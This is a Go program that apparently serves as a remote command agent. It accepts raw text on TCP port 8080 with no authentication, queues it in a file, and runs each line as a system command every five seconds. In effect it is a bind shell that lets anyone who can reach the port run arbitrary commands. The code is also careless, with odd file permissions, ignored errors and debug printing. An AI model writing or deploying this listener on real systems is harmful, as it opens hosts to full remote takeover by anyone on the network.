package main

import (
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"
)

var mu sync.Mutex

func main() {
	go commandListener()

	readCommands()
}

func readCommands() {
	for {
		commandFile, _ := os.OpenFile("../commandlist", os.O_RDWR|os.O_CREATE, 7777)
		mu.Lock()
		AllBytes, _ := ioutil.ReadAll(commandFile)
		commandFile.Truncate(0)
		mu.Unlock()

		var temp []byte = nil
		for _, v := range AllBytes {
			fmt.Println(temp)
			if v != 0 {
				temp = append(temp, v)
			}
		}
		AllBytes = temp

		Lines := strings.Split(string(AllBytes), "\n")

		for _, v := range Lines {
			command := strings.Split(string(v), " ")
			fmt.Println(v)
			out, _ := exec.Command(command[0], command[1:]...).Output()
			fmt.Print(string(out))
		}
		time.Sleep(5 * time.Second)
	}
}

func commandListener() {
	//Pipe to control connection flow
	commandFile, _ := os.OpenFile("../commandlist", os.O_RDWR|os.O_CREATE, 7777)
	conPipe := make(chan string)

	ls, err := net.Listen("tcp", ":8080")
	defer ls.Close()
	if err != nil {
		fmt.Printf("Listen Error: %s", err)
	}

	//Cycle for loop as connections are made
	for {
		go commandConnection(ls, conPipe, commandFile)
		<-conPipe
	}
}

func commandConnection(ls net.Listener, conPipe chan string, commandFile *os.File) {
	con, err := ls.Accept()
	defer con.Close()
	conPipe <- "Connection made"
	if err != nil {
		fmt.Printf("Accept error: %s", err)
		return
	}

	buf := make([]byte, 1024)
	con.Read(buf)

	var temp []byte = nil
	for _, v := range buf {
		if v != 0 {
			temp = append(temp, v)
		}
	}
	buf = temp

	mu.Lock()
	commandFile.Write(temp)
	mu.Unlock()
}
